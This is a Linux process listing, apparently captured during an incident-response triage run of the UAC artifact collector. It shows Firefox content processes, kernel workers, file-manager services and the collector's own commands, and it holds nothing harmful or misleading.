+   5813 meaow    Mon Nov 17 19:51:56 2025 /snap/firefox/6565/usr/lib/firefox/firefox -contentproc -isForBrowser -prefsHandle 0:43946 -prefMapHandle 1:271626 -jsInitHandle 2:242012 -parentBuildID 20250718161710 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {c7cdc56c-1c4c-47c1-b575-d19b5af06e27} -parentPid 5309 -crashReporter 6 -crashHelperPid 5374 -greomni /snap/firefox/6565/usr/lib/firefox/omni.ja -appomni /snap/firefox/6565/usr/lib/firefox/browser/omni.ja -appDir /snap/firefox/6565/usr/lib/firefox/browser 5 tab
+   5992 meaow    Mon Nov 17 19:51:56 2025 /snap/firefox/6565/usr/lib/firefox/firefox -contentproc -parentBuildID 20250718161710 -sandboxingKind 0 -prefsHandle 0:44909 -prefMapHandle 1:271626 -sandboxReporter 2 -chrootClient 3 -ipcHandle 4 -initialChannelId {45db8030-8ddb-48c3-b3b6-ecfe2bf21a8d} -parentPid 5309 -crashReporter 5 -crashHelperPid 5374 -appDir /snap/firefox/6565/usr/lib/firefox/browser 6 utility
+   6141 meaow    Mon Nov 17 19:51:56 2025 /snap/firefox/6565/usr/lib/firefox/firefox -contentproc -isForBrowser -prefsHandle 0:41927 -prefMapHandle 1:271626 -jsInitHandle 2:242012 -parentBuildID 20250718161710 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {9b2ca2ed-d55f-4925-be31-a7e707a58d38} -parentPid 5309 -crashReporter 6 -crashHelperPid 5374 -greomni /snap/firefox/6565/usr/lib/firefox/omni.ja -appomni /snap/firefox/6565/usr/lib/firefox/browser/omni.ja -appDir /snap/firefox/6565/usr/lib/firefox/browser 7 tab
+   6146 meaow    Mon Nov 17 19:51:56 2025 /snap/firefox/6565/usr/lib/firefox/firefox -contentproc -isForBrowser -prefsHandle 0:41927 -prefMapHandle 1:271626 -jsInitHandle 2:242012 -parentBuildID 20250718161710 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {52c9b7b9-e60f-4560-b75d-3ba646155294} -parentPid 5309 -crashReporter 6 -crashHelperPid 5374 -greomni /snap/firefox/6565/usr/lib/firefox/omni.ja -appomni /snap/firefox/6565/usr/lib/firefox/browser/omni.ja -appDir /snap/firefox/6565/usr/lib/firefox/browser 8 tab
+   6163 meaow    Mon Nov 17 19:51:56 2025 /snap/firefox/6565/usr/lib/firefox/firefox -contentproc -isForBrowser -prefsHandle 0:41927 -prefMapHandle 1:271626 -jsInitHandle 2:242012 -parentBuildID 20250718161710 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {2f75ec91-c04e-4b7d-8ece-fb74bf101d47} -parentPid 5309 -crashReporter 6 -crashHelperPid 5374 -greomni /snap/firefox/6565/usr/lib/firefox/omni.ja -appomni /snap/firefox/6565/usr/lib/firefox/browser/omni.ja -appDir /snap/firefox/6565/usr/lib/firefox/browser 9 tab
+   6203 root     Mon Nov 17 19:51:57 2025 [kworker/1:3-events]
+   6221 root     Mon Nov 17 19:51:59 2025 [kworker/u515:3-flush-8:0]
+   6222 meaow    Mon Nov 17 19:52:00 2025 /snap/firefox/6565/usr/lib/firefox/firefox -contentproc -isForBrowser -prefsHandle 0:41967 -prefMapHandle 1:271626 -jsInitHandle 2:242012 -parentBuildID 20250718161710 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {45814dc6-12de-41d1-abcd-a766e7bdcead} -parentPid 5309 -crashReporter 6 -crashHelperPid 5374 -greomni /snap/firefox/6565/usr/lib/firefox/omni.ja -appomni /snap/firefox/6565/usr/lib/firefox/browser/omni.ja -appDir /snap/firefox/6565/usr/lib/firefox/browser 10 tab
+   6263 meaow    Mon Nov 17 19:52:02 2025 /snap/firefox/6565/usr/lib/firefox/firefox -contentproc -isForBrowser -prefsHandle 0:41967 -prefMapHandle 1:271626 -jsInitHandle 2:242012 -parentBuildID 20250718161710 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {7611c3f3-0c6e-4a43-9b3b-01bcdc639d2d} -parentPid 5309 -crashReporter 6 -crashHelperPid 5374 -greomni /snap/firefox/6565/usr/lib/firefox/omni.ja -appomni /snap/firefox/6565/usr/lib/firefox/browser/omni.ja -appDir /snap/firefox/6565/usr/lib/firefox/browser 11 tab
+   6299 meaow    Mon Nov 17 19:52:10 2025 /usr/bin/nautilus --gapplication-service
+   6320 meaow    Mon Nov 17 19:52:11 2025 /usr/libexec/gvfsd-recent --spawner :1.20 /org/gtk/gvfs/exec_spaw/1
+   6329 root     Mon Nov 17 19:52:11 2025 [kworker/u521:1-ttm]
+   6343 root     Mon Nov 17 19:52:20 2025 [kworker/2:2H-kblockd]
+   6369 root     Mon Nov 17 19:52:41 2025 [kworker/3:2-events]
+   6372 root     Mon Nov 17 19:52:48 2025 [kworker/u521:3-ttm]
+   6389 root     Mon Nov 17 19:53:39 2025 [kworker/2:1]
+   6390 root     Mon Nov 17 19:53:39 2025 [kworker/2:3-events]
+   6421 root     Mon Nov 17 19:54:01 2025 [kworker/u518:0]
+   6654 root     Mon Nov 17 19:55:37 2025 sudo ./uac -p ir_triage /tmp
+   6655 root     Mon Nov 17 19:55:37 2025 sudo ./uac -p ir_triage /tmp
+   6656 root     Mon Nov 17 19:55:37 2025 /bin/sh ./uac -p ir_triage /tmp
+   7815 root     Mon Nov 17 19:55:38 2025 /bin/sh ./uac -p ir_triage /tmp
+   8202 root     Mon Nov 17 19:55:38 2025 ps -axo pid,user,lstart,args
